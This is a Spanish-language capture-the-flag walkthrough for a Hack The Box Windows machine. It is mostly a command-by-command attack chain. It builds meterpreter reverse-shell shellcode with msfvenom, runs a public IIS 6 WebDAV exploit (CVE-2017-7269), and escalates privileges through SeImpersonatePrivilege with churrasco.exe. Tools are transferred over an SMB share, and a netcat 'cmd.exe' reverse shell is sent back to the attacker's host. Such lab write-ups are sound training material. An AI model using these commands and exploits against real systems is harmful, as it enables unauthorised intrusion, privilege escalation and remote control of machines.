## HTB-Grandpad
- Maquina: Windows
- Level: Easy
- IP: 10.10.10.14

## Herramientas a utilizar:

- `nmap`
- https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269
- https://github.com/AonCyberLabs/Windows-Exploit-Suggester
- https://github.com/Re4son/Churrasco/
- https://github.com/int0x33/nc.exe
- `msfvenom`
- `msconsole`

#### NMAP
```
nmap -sC -sV -o scan_grandpad.txt 10.10.10.14
```
#### MSFVEDOM
> Crearemos nuestro shellcode con:
```
msfvenom -p windows/meterpreter/reverse_tcp -f raw -e x86/alpha_mixed LHOST=10.10.14.17 LPORT=443 > shellcode
```
> Descargaremos nuestro exploit
`git clone https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269`

Desde otro Terminal el cual llamaremos `Terminal#2`ejecutaremos msfconsole
```
msfconsole
use exploit/multi/handler
set lhost 10.10.14.17
set lport 443
run
```

Nuestro terminal principal el cual llamaremos `Terminal#1` y ejecutamos
```
python iis6_r_shell 10.10.10.14 80 10.10.14.17 443
```
Luego de ejecutar lo del `Terminal#1` solo debemos ir al `Terminal#2` y ya deberiamos tener shell.
Verificamos con `whoami` veremos que somos.
`nt authority\network service`

Ahora nos vamos a `cd ../../../` luego `cd Documents and settings`
y veremos que tenemos dos usuario `Adminsitrator` y `Harry`. pero no tenemos acceso a ninguno.

Volvemos a `c:\` aqui encontraremos un directorio llamado `wmpub` el cual debemos verificar que privilegios tenemos.
```
icacls wmpub
whoami /priv
```
Vemos que tenemos el privilegio de:

|SeChangeNotifyPrivilege| Bypass traverse checking |   Enabled |
|-----------------|-----------------|-----------------|
|SeImpersonatePrivilege| Impersonate a client after authentication| Enabled 
|SeCreateGlobalPrivilege|Create global objects |Enabled|

>Pero el que nos llama a la atecion es el {SeImpersonatePrivilege} para esto debemos utilizar y descargar `https://github.com/Re4son/Churrasco/ `
`churrasco.exe` y `nc.exe` los cuales debemos subir a grandpad 
```
git clone https://github.com/Re4son/Churrasco/
git clone https://github.com/int0x33/nc.exe
mv nc.exe nc
cd nc
mv nc.exe ../
mv nc.exe Churrasco
cd Churrasco
impacket-smbserver share ./
```
Ahora desde grandpad ejecutamos
```
copy \\10.10.14.17\share\nc.exe .
copy \\10.10.14.17\share\churrasco.exe c.exe
```
Ahora volvemos abrir un `nc` en nuestra Terminal por el puerto 443
```
rlwrap nc -lnvp 443
```

Ahora desde grandpad ejecutamos.
```
.\c.exe -d "C:\wmpub\nc.exe -e cmd.exe 10.10.14.17 443"
```
```
cd C:\Documents and Settings
type harry\Desktop\user.txt
type Administrator\desktop\root.txt
```